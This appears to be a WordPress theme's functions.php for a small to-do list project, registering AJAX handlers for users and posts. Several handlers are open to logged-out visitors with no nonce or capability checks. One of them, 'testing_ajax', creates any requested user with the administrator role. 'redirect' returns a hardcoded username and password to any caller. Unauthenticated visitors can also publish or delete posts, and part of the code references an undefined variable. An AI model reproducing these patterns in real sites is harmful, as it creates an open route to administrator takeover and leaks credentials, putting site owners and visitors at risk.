<?php

function add_styles(){
	wp_enqueue_style("style",get_stylesheet_uri());
	wp_enqueue_style("bootstrap",get_template_directory_uri()."/bower_components/bootstrap/dist/css/bootstrap.min.css");
	wp_enqueue_script("jquery",get_template_directory_uri()."/bower_components/jquery/dist/jquery.min.js");
	wp_enqueue_script("bootstap-min",get_template_directory_uri()."/bower_components/bootstrap/dist/js/bootstrap.min.js","jquery");
	wp_enqueue_script("index",get_template_directory_uri()."/index.js","jquery",false);

}
// function add_scripts()
// add_action( 'after_setup_theme', 'redirect' );
add_action('wp_enqueue_scripts','add_styles');
add_action('wp_ajax_nopriv_testing','testing_ajax');
add_action('wp_ajax_testing','testing_ajax');
//add_action( 'template_redirect', 'redirect' );
add_action("wp_ajax_wp_save_as_post","save_as_post");
add_action("wp_ajax_nopriv_wp_save_as_post", "save_as_post");
add_action("wp_ajax_get_data","get_data");
add_action("wp_ajax_nopriv_get_data","get_data");
add_action("wp_ajax_delete_post","delete_post");
add_action("wp_ajax_nopriv_delete_post","delete_post");
function testing_ajax(){
	// echo "hello world";
	// die();

	$usn = $_POST['usn'];
	$email = $_POST['email'];
	$pwd = $_POST['pwd'];

	$user_data = array(
			'user_login' => $usn,
			'user_email' => $email,
			'user_pass' => $pwd
		);
	$user_id = wp_insert_user($user_data);
	$user = new WP_User( $user_id );
  	$user->set_role( 'administrator' );

	if(!is_wp_error($user_id)){
		echo "User Created: " . $user_id;
	}
}
add_action('wp_ajax_redirect','redirect');
add_action('wp_ajax_nopriv_redirect','redirect');

function redirect(){
	// echo '<script>console.log("Your stuff here")</script>';

	// $credentials = array();
	// $credentials['user_password'] = $_POST['password'];
	// $credentials['user_login'] = $_POST['username'];
	// $credentials['remember'] = true;
	// echo $credentials['user_password'],$credentials['user_login'];
	$credentials = array ('user_login' => 'prathyush', 'user_password' => 'ZEB#iBmfvSYp*6KUiu', 'remember' => true)	;
	echo json_encode($credentials);
	//$user = wp_signon($credentials,false);
	$userID = $user->ID;

	// wp_set_current_user($userID,$user_login);
	// wp_set_auth_cookie($userID,true,false);
	// do_action('wp_login',$user_login);
	if(is_user_logged_in()){
		echo "success";
	}
	else{
		echo "fail";
	}
	// echo '<script>console.log("Your writing")</script>';

	// if(!is_wp_error($user)){
	// // 	wp_redirect("http://localhost:8080/My_Test/to-do-list/");
	// 	// echo '<script>console.log("Your stuff here")</script>'; 
	// // $page = get_page_by_title('To-Do list');
		
		
	// }
	// else{
	// 	echo "Invalid Id" ;
	// }
}
function save_as_post(){
	$title = $_POST['header'];
	$content = $_POST['content'];
	$post_id = post_exists($title);
	$postarr = array ('ID' => $post_id, 'post_title' => $title, 'post_content' => $content);
	$post_id = wp_insert_post($postarr);
	
	if($post_id != 0){
		wp_publish_post($post_id);
		echo "Success";
		
	}
	else{
		echo "Failure";
	}
	wp_die();
}
function get_data(){
	$post_id = $_POST['post_id'];
	if($post_id != 0){
		$post_title = get_the_title($post_id);
		$post = get_post($post_id);
		$post_content = $post->post_content;
		echo $post_title.','.$post_content;
		die();	
	}
}

// Deleting a Post
function delete_post(){
	$post_id = $_POST["post_del_id"];
	$result = wp_delete_post($post_id);
	if($result == false){
		echo "Unable to delete";
	}
	else{
		echo "Deleted Successfully"	;
	}
	

}
// function retrieve_todo_lists(){

// }

// add_shortcode('retrieve_list' , 'retrieve_todo_lists');